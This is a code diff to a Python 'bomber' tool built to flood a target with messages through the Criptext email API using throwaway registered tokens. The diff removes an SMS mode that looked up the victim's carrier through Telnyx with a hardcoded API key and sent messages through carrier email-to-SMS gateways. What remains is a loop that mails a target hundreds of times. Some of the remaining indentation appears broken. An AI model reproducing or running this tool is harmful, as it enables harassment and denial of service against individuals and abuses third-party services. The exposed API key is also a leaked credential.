@@ -26,10 +26,8 @@ def register():
         authToken = authToken.split('","r')[0]
         return authToken
 def startUp():
-    typeAttack =  input("Email or SMS Attack [E/S]:  ")
-    if  typeAttack == "E":
         clear()
-        print("Email Bomb Selected")
+        print("Email Bomb Initiating")
         global sentMail
         sentMail  = 0
         time.sleep(1)
@@ -39,84 +37,22 @@ def startUp():
         clear()
         print("Email: "+str(targetMail)+" Loaded Into Barrel -- Ready for Fire.")
         time.sleep(1)
-        print("Time for the real show ;)")
+        print("Bomb time ;)")
         time.sleep(1)
         clear()
         global type2
         type2 = 2
         return targetMail
-    
-    elif typeAttack == "S":
-        clear()
-        print("SMS Bomb Selected")
-        global sentSMS
-        sentSMS  = 0
-        time.sleep(1)
-        clear()
-        global targetNumber
-        targetNumber = input("Enter Target Number: ")
-        clear()
-        print("Email: "+str(targetNumber)+" Loaded Into Barrel -- Checking Carrier Details...")
-        time.sleep(1)
-        clear()
-        apiKey = "KEY0173F11C6B63CF4DA8DCA6D893E85BD2_gcTiiuXRq2RzTMU2hvs5iG"
-        with requests.Session() as sess:
-            url = "https://api.telnyx.com/v2/number_lookup/+1"+str(targetNumber)+"?type=carrier&type=caller-name"
-            headers = {
-                "Authorization": "Bearer "+str(apiKey),
-                "Accept": "application/json",
-                    "Content-Type": "application/json",
-                    }
-            r = sess.get(url, headers=headers)
-            global carrier
-            if "VERIZON" in r.text:
-                print("Verizon Detected")
-                carrier = "@vtext.com"
-            elif "CELLCO" in r.text:
-                print("Verizon Detected")
-                carrier = "@vtext.com"
-            elif "Cingular" in r.text:
-                print("AT&T Detected")
-                carrier = "@txt.att.net"
-            elif "CINGULAR" in r.text:
-                print("AT&T Detected")
-                carrier = "@txt.att.net"
-            elif "T-Mobile" in r.text:
-                print("T-Mobile Detected")
-                carrier = "@tmomail.net"
-            elif "Sprint" in r.text:
-                print("Sprint Detected")
-                carrier = "@messaging.sprintpcs.com"
-            elif "SPECTRUM" in r.text:
-                print("Sprint Detected")
-                carrier = "@messaging.sprintpcs.com"
-            time.sleep(2)
-            print("Time to Fire... ;)")
-        global type
-        type = 1
-        clear()
+
+    clear()
 def clear():
     os.system("clear")
 def authenticated():
-    recoYesNo =  input("Do you already have a token? [Y/N]: ")
-    if recoYesNo  == "N":
         global recoveryMail
         recoveryMail = input("Enter Token  Registration  Email (temp-mail.org): ")
         register()
         clear()
         confirmationComplete = input("Token Registration Confirmation Sent to Mail. Type [Y] Once Confirmed: ")
-        if confirmationComplete == "Y":
-            print("Registration Complete --  Time to Bomb ;)")
-            time.sleep(1)
-            os.system("clear")
-            startUp()
-    elif recoYesNo  == "Y":
-        authToken  = input("Please Provide the Token: ")
-        clear()
-        print("Auth Token Accepted")
-        time.sleep(1)
-        clear()
-        startUp()
     else:
         print("Invalid Response Recieved")
         time.sleep(0.5)
@@ -173,43 +109,10 @@ def mailBomb():
         }
         r = sess.post(url, headers=headers, data=content, verify=False)
 
-def smsBomb():
-    with requests.Session() as sess:
-        global r
-        '''
-            proxyz = random.choice(proxylist)
-            proxies = {'https': 'https://' + proxyz, 'http': 'http://' + proxyz}
-            sess.proxies = proxies
-            '''
-        url = "http://api.criptext.com/email"
-        content = '{"subject":"'+str(namegen)+'","criptextEmails":[],"guestEmail":{"to":["'+str(targetNumber)+str(carrier)+'"],"cc":[],"bcc":[],"body":"'+str(contentBody)+'"}}'
-        headers = {
-            "Authorization": "Bearer "+str(authToken),
-            "criptext-api-version": "11.0.0",
-            "Accept-Language": "en_us",
-            "App-Version": "0.23.6",
-            "OS": "Samsung SM-G960U1 Android 10 (API 29)",
-            "Content-Type": "application/json",
-            "Content-Length": "180",
-            "Host": "api.criptext.com",
-            "Connection": "Keep-Alive",
-            "Accept-Encoding": "gzip",
-            "User-Agent": "okhttp/3.12.1",
-        }
-        r = sess.post(url, headers=headers, data=content, verify=False)
-
-
 clear()
 authenticate()
-if type == 1:
+
     for i in range(250):
-        smsBomb()
-        sentSMS+=1
-        clear()
-        print("Sent Count: "+str(sentSMS))
-        time.sleep(0.5)
-elif type2 == 2:
-    for i in range(350):
         mailBomb()
         sentMail+=1
         clear()
